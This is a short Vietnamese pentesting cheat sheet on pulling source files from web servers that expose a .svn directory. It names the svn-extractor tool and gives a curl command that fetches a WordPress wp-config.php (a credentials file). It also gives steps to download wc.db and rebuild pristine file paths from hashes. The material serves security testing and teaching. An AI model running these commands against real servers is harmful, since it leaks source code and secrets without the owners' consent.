# Subversion

> Subversion (thường được viết tắt là SVN) là một hệ thống quản lý phiên bản tập trung (VCS) được sử dụng rộng rãi trong ngành phát triển phần mềm. Ban đầu được phát triển bởi CollabNet Inc. vào năm 2000, Subversion được thiết kế như một phiên bản cải tiến của CVS (Concurrent Versions System) và sau đó đã được áp dụng rộng rãi nhờ tính mạnh mẽ và độ tin cậy.

## Tóm tắt

* [Công cụ](#tools)
* [Phương pháp](#methodology)
* [Tài liệu tham khảo](#references)

## Công cụ

* https://github.com/anantshri/svn-extractor - Script đơn giản để trích xuất tất cả tài nguyên web thông qua thư mục `.SVN` được expose trên network.

  ```powershell
  python svn-extractor.py --url "url with .svn available"
  ```

## Phương pháp

```powershell
curl http://blog.domain.com/.svn/text-base/wp-config.php.svn-base
```

1. Tải cơ sở dữ liệu SVN từ `http://server/path_to_vulnerable_site/.svn/wc.db`

   ```powershell
   INSERT INTO "NODES" VALUES(1,'trunk/test.txt',0,'trunk',1,'trunk/test.txt',2,'normal',NULL,NULL,'file',X'2829',NULL,'$sha1$945a60e68acc693fcb74abadb588aac1a9135f62',NULL,2,1456056344886288,'bl4de',38,1456056261000000,NULL,NULL);
   ```

2. Tải xuống các file đáng chú ý

   * Xóa prefix `$sha1$`
   * Thêm hậu tố `.svn-base`
   * Sử dụng byte đầu tiên của hash làm thư mục con trong thư mục `pristine/` (`94` trong trường hợp này)
   * Tạo đường dẫn hoàn chỉnh, sẽ là: `http://server/path_to_vulnerable_site/.svn/pristine/94/945a60e68acc693fcb74abadb588aac1a9135f62.svn-base`

## Tài liệu tham khảo

* [SVN Extractor dành cho Web Pentesters - Anant Shrivastava - March 26, 2013](https://web.archive.org/web/20130329022536/http://blog.anantshri.info:80/svn-extractor-for-web-pentesters)
